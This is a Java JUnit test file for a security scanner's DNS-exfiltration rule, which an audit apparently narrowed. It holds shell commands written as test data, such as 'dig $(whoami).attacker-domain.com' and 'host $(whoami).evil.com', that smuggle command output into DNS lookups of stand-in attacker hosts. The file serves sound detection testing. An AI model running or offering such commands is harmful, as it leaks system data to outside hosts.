package com.navneet.executespec.security;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

/**
 * B-26 (audit, 2026-05-09) regression coverage. The DNS-exfil regex used to be {@code
 * \b(dig|nslookup)\b.*\$\(}, which flagged every legitimate ad-hoc shell-substitution lookup.
 * Narrowed to only the exfil shape (lookup of attacker-controlled host with a substituted
 * subdomain).
 */
@DisplayName("CodeAbuseScanner — DNS-exfil narrowness")
class CodeAbuseScannerDnsExfilTest {

  private final CodeAbuseScanner scanner = new CodeAbuseScanner();

  @Test
  @DisplayName("legitimate `nslookup $(whoami)` is NOT flagged")
  void legitNslookupAllowed() {
    var r = scanner.scan("debug.sh", "nslookup $(whoami)\n");
    assertThat(r.flagged()).isFalse();
  }

  @Test
  @DisplayName("DNS exfil with attacker host IS flagged")
  void exfilFlagged() {
    var r = scanner.scan("attack.sh", "dig $(whoami).attacker-domain.com\n");
    assertThat(r.flagged()).isTrue();
    assertThat(r.category()).isEqualTo("DATA_EXFILTRATION");
  }

  @Test
  @DisplayName("dig @ns + substituted prefix IS flagged")
  void exfilWithExplicitNsFlagged() {
    var r = scanner.scan("attack.sh", "dig @ns1.attacker.com $(whoami).x\n");
    assertThat(r.flagged()).isTrue();
  }

  @Test
  @DisplayName("`host $(whoami).evil.com` IS flagged (alt resolver)")
  void exfilHostCommandFlagged() {
    var r = scanner.scan("attack.sh", "host $(whoami).evil.com\n");
    assertThat(r.flagged()).isTrue();
  }
}
